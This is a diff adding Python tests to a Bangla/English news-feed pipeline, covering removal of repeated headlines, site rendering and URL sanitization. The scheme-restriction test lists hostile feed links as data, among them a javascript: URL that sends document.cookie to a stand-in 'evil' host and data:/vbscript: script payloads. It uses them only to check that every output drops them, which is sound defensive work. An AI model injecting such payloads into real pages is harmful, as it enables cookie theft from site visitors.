@@ -2,6 +2,7 @@
 resolution. No network calls -- feedparser.parse and extract_text are
 monkeypatched. Run with: python test_pipeline.py
 """
+import unicodedata
 from datetime import datetime, timedelta, timezone
 from types import SimpleNamespace
 from unittest.mock import patch
@@ -100,6 +101,32 @@ def test_retry_raises_after_exhausting_attempts():
     print("ok: retry raises after exhausting attempts")
 
 
+def test_collect_results_strips_headline_repeated_in_body():
+    """Bangla outlets routinely open the article body with the headline (and a
+    kicker line that repeats it again). Left in, the teaser is just the
+    headline a second time."""
+    # খেলোয়াড়দের spelled precomposed in the title (U+09DF/U+09DC, as feeds send
+    # it) and nukta-decomposed in the body (as the extractor returns it) --
+    # canonically the same string, byte-wise different. NFC can't fix it:
+    # those letters are composition exclusions.
+    title = "খেলোয়াড়দের সংবাদ"
+    decomposed = unicodedata.normalize("NFD", title)
+    assert decomposed != title, "fixture must actually differ byte-wise"
+
+    articles = [
+        {"title": "শিরোনাম", "text": "শিরোনাম\nশিরোনাম\nআসল লেখা এখানে।", "section_hint": "Tech"},
+        {"title": "Only The Title", "text": "Only The Title", "section_hint": "Tech"},
+        {"title": title, "text": decomposed + "\nমূল প্রতিবেদন।", "section_hint": "Tech"},
+        {"title": "খবর", "text": "সম্পূর্ণ আলাদা লেখা।", "section_hint": "Tech"},
+    ]
+    results = pipeline.collect_results(articles)
+    assert results[0]["summary"] == "আসল লেখা এখানে।", results[0]["summary"]
+    assert results[1]["summary"] == "Only The Title", "body that is nothing but the headline still shows something"
+    assert results[2]["summary"] == "মূল প্রতিবেদন।", results[2]["summary"]
+    assert results[3]["summary"] == "সম্পূর্ণ আলাদা লেখা।", "body that never repeats the headline is untouched"
+    print("ok: collect_results strips repeated headline")
+
+
 def test_collect_results_uses_raw_title_and_excerpt():
     articles = [
         {"title": "Some Headline", "text": "a" * 500, "section_hint": None},
@@ -112,6 +139,85 @@ def test_collect_results_uses_raw_title_and_excerpt():
     assert results[1]["headline"], "missing title still gets a placeholder, not empty"
     assert results[1]["section"] == "Tech", "hinted section passed through untouched"
     print("ok: collect_results")
+
+
+def test_feed_links_are_scheme_restricted():
+    """Feeds are untrusted. A javascript:/data: link must never reach an href
+    on the published site, in the EPUB, or in subscriber email -- HTML-escaping
+    does not defuse those, they stay live links."""
+    hostile = [
+        "javascript:fetch('https://evil/?c='+document.cookie)",
+        "JaVaScRiPt:alert(1)",
+        "data:text/html,<script>alert(1)</script>",
+        "vbscript:msgbox",
+        "  javascript:alert(1)  ",
+        None,
+    ]
+    for bad in hostile:
+        assert pipeline.safe_url(bad) == "", f"must be dropped: {bad!r}"
+    for good in ["https://x.com/a?b=1&c=2", "http://x.com", "  https://x.com  "]:
+        assert pipeline.safe_url(good) == good.strip(), good
+
+    articles = [{"section_hint": "Tech", "source": "Evil Feed", "link": "javascript:alert(1)"}]
+    results = [{"index": 0, "headline": "h", "summary": "s", "section": "Tech"}]
+    assert pipeline.group_by_section(articles, results)["Tech"][0]["link"] == "", \
+        "sanitized early, at the funnel every renderer is fed from"
+
+    # ...and again at each sink, so it holds for a `grouped` built any other
+    # way. This dict deliberately bypasses group_by_section.
+    grouped = {s: [] for s in pipeline.SECTIONS}
+    grouped["Tech"] = [{"anchor": "a0", "headline": "h", "summary": "s", "teaser": "t",
+                        "source": "Evil Feed", "link": "javascript:alert(1)"}]
+    run_dt = datetime(2026, 8, 12, 1, 0, tzinfo=timezone.utc)
+
+    import tempfile
+    from pathlib import Path
+    epub_out = Path(tempfile.mkdtemp()) / "t.epub"
+    pipeline.build_epub(grouped, run_dt, epub_out)
+    outputs = {
+        "run page": pipeline.render_run_html(grouped, run_dt),
+        "email": pipeline.render_email_html(grouped, run_dt),
+        "epub": epub_out.read_bytes().decode("utf8", "ignore"),
+    }
+    for name, out in outputs.items():
+        assert "javascript:" not in out.lower(), f"{name} leaked a javascript: URL"
+        assert 'href=""' not in out, f"{name} emitted an empty href instead of dropping the link"
+    assert "Evil Feed" in outputs["run page"], "source is still credited without a link"
+    print("ok: feed links are scheme-restricted")
+
+
+def test_render_site_pages():
+    """Run page renders, the index reuses its সূচি fragment, and the tally
+    segments carry the real per-section counts."""
+    import tempfile
+    from pathlib import Path
+    grouped = {s: [] for s in pipeline.SECTIONS}
+    grouped["Local"] = [{"anchor": f"a{i}", "headline": f"শিরোনাম {i} & Q<A", "summary": "সারাংশ",
+                         "teaser": "সারাংশ", "source": "Prothom Alo", "link": "https://x?a=1&b=2"}
+                        for i in range(3)]
+    grouped["Tech"] = [{"anchor": "a3", "headline": "H", "summary": "s", "teaser": "s",
+                        "source": "Ars", "link": "https://y"}]
+    run_dt = datetime(2026, 8, 12, 0, 30, tzinfo=timezone.utc)  # 06:30 BD -> dawn
+
+    site = Path(tempfile.mkdtemp())
+    (site / "runs").mkdir()
+    with patch.object(pipeline, "SITE_DIR", site):
+        fname = "runs/2026-08-12-0030.html"
+        (site / fname).write_text(pipeline.render_run_html(grouped, run_dt))
+        run_html = (site / fname).read_text()
+        index = pipeline.render_index([{"dt": run_dt.isoformat(), "file": fname,
+                                        "counts": {"Local": 3, "Tech": 1}}])
+
+    assert "&amp;" in run_html and "Q&lt;A" in run_html, "headlines/links must be HTML-escaped"
+    assert '<li class=seg style="--n:3;--i:0">' in run_html, "tally segment must be sized by count"
+    assert 'id=s-Local' in run_html and run_html.count('id=s-Local') == 1, "one anchor per section"
+    assert "প্রভাতী" in run_html, "dawn edition label"
+
+    assert "<section class=detail>" not in index, "index is digest-only -- excerpts live on the run page"
+    assert 'href="runs/2026-08-12-0030.html#a0"' in index, "digest rows must point at the run page"
+    assert "id=s0-Local" in index and "id=s-Local" not in index, "stacked editions must not collide"
+    assert f"<h2 class=part>{pipeline.PART_TOC}</h2>" not in index, "redundant সূচি label dropped on index"
+    print("ok: render_run_html + render_index")
 
 
 def test_parse_recipients_handles_separators_and_whitespace():
@@ -128,5 +234,8 @@ if __name__ == "__main__":
     test_retry_succeeds_after_transient_failures()
     test_retry_raises_after_exhausting_attempts()
     test_collect_results_uses_raw_title_and_excerpt()
+    test_collect_results_strips_headline_repeated_in_body()
+    test_render_site_pages()
+    test_feed_links_are_scheme_restricted()
     test_parse_recipients_handles_separators_and_whitespace()
     print("all tests passed")
